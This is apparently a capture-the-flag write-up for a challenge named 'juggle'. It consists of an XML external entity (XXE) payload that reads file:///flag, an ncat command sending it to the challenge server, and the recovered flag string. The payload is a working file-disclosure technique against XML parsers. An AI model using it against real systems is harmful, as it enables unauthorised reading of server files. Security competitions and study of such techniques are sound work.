# juggle

XXE

payload:

```xml
<!DOCTYPE kaibro[
        <!ENTITY xxe SYSTEM "file:///flag">
]>
<root>&xxe;</root>
```

ncat 35.246.237.11 1 < payload.xml

`35C3_The_chef_gives_you_his_compliments`
